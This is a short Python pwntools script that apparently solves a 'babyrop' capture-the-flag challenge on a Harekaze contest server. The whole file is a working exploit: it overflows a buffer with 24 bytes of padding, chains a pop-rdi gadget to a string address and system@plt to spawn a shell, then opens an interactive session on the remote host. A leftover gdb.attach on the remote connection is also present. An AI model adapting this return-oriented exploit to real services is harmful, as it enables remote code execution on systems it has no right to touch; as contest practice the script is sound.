from pwn import *
context.log_level = 'debug'

TARGET = './babyrop'
HOST = 'problem.harekaze.com'
PORT = 20001

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
set follow-fork-mode parent
b*0x40061a
c
''')
elf = ELF(TARGET) 

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('name?')

rdi = 0x400683
payload = ''
payload += 'a'*24
payload += p64(rdi)
payload += p64(0x601048)
# payload += p64(rdi+1)
payload += p64(elf.plt['system'])

r.sendline(payload)

r.interactive()
r.close()
